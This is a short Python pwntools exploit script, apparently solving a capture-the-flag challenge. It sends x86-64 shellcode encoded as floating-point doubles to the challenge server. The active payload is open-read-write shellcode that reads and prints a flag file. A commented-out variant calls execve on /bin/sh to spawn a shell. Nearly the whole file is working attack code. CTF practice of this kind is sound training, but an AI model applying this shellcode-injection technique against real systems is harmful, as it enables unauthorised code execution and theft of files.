from pwn import *
import struct

elf = ELF("../challenge/chall")
context.arch = "amd64"


def conn():
    if args.LOCAL:
        r = process([elf.path])
    else:
        r = remote("dancer.chals.nitectf25.live", 1337, ssl=True)
    return r


r = conn()


def make_double(code):
    code = code.ljust(8, b"\x90")  # Pad to 8 bytes with NOPs (0x90)
    h = code.hex()
    x = struct.unpack("<d", bytes.fromhex(h))[0]
    log.info("{:.30E}".format(x))
    return "{:.30E}".format(x)


# execve
"""
payload = [
make_double(asm("mov eax,0x0068732f")),
make_double(asm("shl rax,32")),
make_double(asm("add rax,0x6e69622f")),
make_double(asm("push rax;mov rdi,rsp")),
make_double(asm("xor rsi,rsi;xor rdx,rdx")),
make_double(asm("mov rax,0x3b")),
make_double(asm("syscall")),
]
"""
# ORW
payload = [
    make_double(asm("mov eax,0x67616c66")),
    make_double(asm("shl rax,16")),
    make_double(asm("add rax,0x2f2e")),
    make_double(asm("push rax;mov rdi,rsp")),
    make_double(asm("xor rsi,rsi")),
    make_double(asm("mov rax,2")),
    make_double(asm("syscall")),
    make_double(asm("mov rdi,rax")),
    make_double(asm("lea rsi,[rdx+200]")),
    make_double(asm("mov rdx,60")),
    make_double(asm("mov rax,0")),
    make_double(asm("syscall")),
    make_double(asm("mov rdi,1")),
    make_double(asm("mov rax,1")),
    make_double(asm("syscall")),
]
r.sendlineafter(b"enter!", str(len(payload)).encode())
for i in payload:
    r.sendline(i.encode())
r.interactive()
